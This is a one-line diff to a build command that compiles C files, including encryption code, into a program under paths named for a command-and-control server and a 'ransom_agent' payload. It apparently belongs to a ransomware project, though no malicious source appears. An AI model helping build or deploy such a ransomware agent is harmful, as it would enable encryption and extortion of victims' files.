@@ -1,1 +1,1 @@
-gcc main.c files.c encryption.c -lcurl -lssl -lcrypto -w -o program 
+/usr/bin/gcc /var/www/c2/Payload/src/ransom_agent/new_main.c /var/www/c2/Payload/src/ransom_agent/files.c /var/www/c2/Payload/src/ransom_agent/encryption.c -lcurl -lssl -lcrypto -w -o /var/www/c2/Payload/src/ransom_agent/program
